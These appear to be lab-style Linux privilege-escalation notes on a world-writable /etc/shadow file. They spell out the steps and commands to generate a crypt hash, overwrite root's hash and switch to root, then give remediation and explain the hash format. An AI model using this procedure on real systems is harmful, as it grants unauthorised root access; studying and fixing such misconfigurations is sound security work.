## 📝 Linux PrivEsc Notes: World-Writable `/etc/shadow` File

---

## Target Vector
Unsafe file permissions (world-writable) on `/etc/shadow`

## Exploit Type
Direct password hash overwrite → authentication bypass

---

# 1. Backend Concept: Cracking vs Overwriting

### Previous Scenario (Readable `/etc/shadow`)
- Only password hashes could be read
- Attacker had to **crack hashes offline**
- Weak passwords = vulnerable, strong passwords = safe

### Current Scenario (Writable `/etc/shadow`)
- Attacker does NOT need original password
- Attacker simply:
  - generates own password hash
  - replaces root’s hash
- Result: **instant root access without cracking**

---

# 2. Step-by-Step Exploitation

---

## Step A: Check Permissions

```bash
ls -l /etc/shadow
```

### Vulnerable example:
```text
-rw-rw-rw- 1 root root ...
```

### Meaning:
- World-writable (`rw- rw- rw-`)
- Any user can modify the file contents
- Critical security misconfiguration

---

## Step B: Generate New Password Hash

Linux does NOT store plaintext passwords in `/etc/shadow`.

We generate a **Linux-compatible crypt hash**:

```bash
mkpasswd -m sha-512 myroot123
```

---

### Alternative (if mkpasswd unavailable):

```bash
python3 -c 'import crypt; print(crypt.crypt("myroot123", crypt.METHOD_SHA512))'
```

---

### Output example:
```text
$6$rounds=40000$saltvalue$XyZabc...hashedstring...
```

---

## Step C: Replace Root Password Hash

```bash
nano /etc/shadow
```

---

### Before:
```text
root:$6$oldhashdata...:19145:0:99999:7:::
```

### After:
```text
root:$6$rounds=40000$saltvalue$XyZabc...:19145:0:99999:7:::
```

---

### Key point:
Only replace the **second field (password hash)** between the first two `:`.

---

## Step D: Gain Root Access

```bash
su root
```

Enter:
```
myroot123
```

---

### Result:
```bash
whoami
root
```

---

# 🛡️ Remediation (Fixing the Issue)

---

## Restore Secure Permissions

```bash
sudo chmod 600 /etc/shadow
```

---

## Correct Ownership (Important)

```bash
sudo chown root:shadow /etc/shadow
```

---

## Security Principle

- `/etc/shadow` must NEVER be writable by non-root users
- Even small permission mistakes → full system compromise

---

# 🧠 Deep Concept: Why `mkpasswd -m sha-512` Works

This is the most important conceptual part.

---

## 1. Normal SHA-512 (NOT used in Linux auth)

```bash
echo -n "password" | sha512sum
```

### Problem:
- No salt
- Same input → same output
- Vulnerable to rainbow tables

---

## 2. Linux Crypt SHA-512 (USED in `/etc/shadow`)

`mkpasswd` generates **not just a hash**, but a full authentication-ready structure.

---

## Format:

```
$6$rounds=5000$salt$hashedvalue
```

---

### Breakdown:

### `$6$`
- Algorithm identifier
- Means: SHA-512 Crypt

---

### `rounds=5000`
- Key stretching (hash repeated many times)
- Slows down brute force attacks

---

### `salt`
- Random string added to password
- Prevents identical passwords from producing same hash

---

### final hash
- Result of salted + iterated hashing process

---

## 3. Internal Process of mkpasswd

When you run:

```bash
mkpasswd -m sha-512 myroot123
```

### It does:

1. Generates random salt
2. Combines:
   ```
   password + salt
   ```
3. Runs SHA-512 repeatedly (rounds)
4. Produces final crypt hash
5. Encodes it in **Modular Crypt Format (MCF)**

---

## Why this is important

Because Linux authentication system (PAM) expects:

- algorithm identifier
- salt
- iterations
- final hash

So a simple `sha512sum` is NOT valid for `/etc/shadow`.

---

# 🧠 Quick Summary

- Writable `/etc/shadow` = full system compromise
- Attacker replaces root hash instead of cracking it
- `mkpasswd -m sha-512` generates Linux-compatible crypt hash
- `su root` gives instant privilege escalation

---

